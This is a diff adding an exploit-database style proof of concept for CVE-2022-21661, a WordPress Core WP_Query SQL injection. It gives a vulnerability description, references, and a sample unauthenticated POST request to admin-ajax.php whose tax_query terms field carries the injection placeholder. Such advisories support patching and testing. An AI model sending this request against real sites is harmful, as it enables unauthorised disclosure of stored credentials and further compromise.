@@ -1,0 +1,38 @@
+# Exploit Title: WordPress Core 5.8.2 - 'WP_Query' SQL Injection
+# Date: 11/01/2022
+# Exploit Author: Aryan Chehreghani
+# Vendor Homepage: https://wordpress.org
+# Software Link: https://wordpress.org/download/releases
+# Version: < 5.8.3
+# Tested on: Windows 10
+# CVE : CVE-2022-21661
+
+# [ VULNERABILITY DETAILS ] :
+
+#This vulnerability allows remote attackers to disclose sensitive information on affected installations of WordPress Core,
+#Authentication is not required to exploit this vulnerability, The specific flaw exists within the WP_Query class,
+#The issue results from the lack of proper validation of a user-supplied string before using it to construct SQL queries,
+#An attacker can leverage this vulnerability to disclose stored credentials, leading to further compromise.
+
+# [ References ] :
+
+https://wordpress.org/news/category/releases
+https://www.zerodayinitiative.com/advisories/ZDI-22-020
+https://hackerone.com/reports/1378209
+
+# [ Sample Request ] :
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+Upgrade-Insecure_Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.99
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Cache-Control: max-age=0
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+
+action=<action_name>&nonce=a85a0c3bfa&query_vars={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["<inject>"]}}}
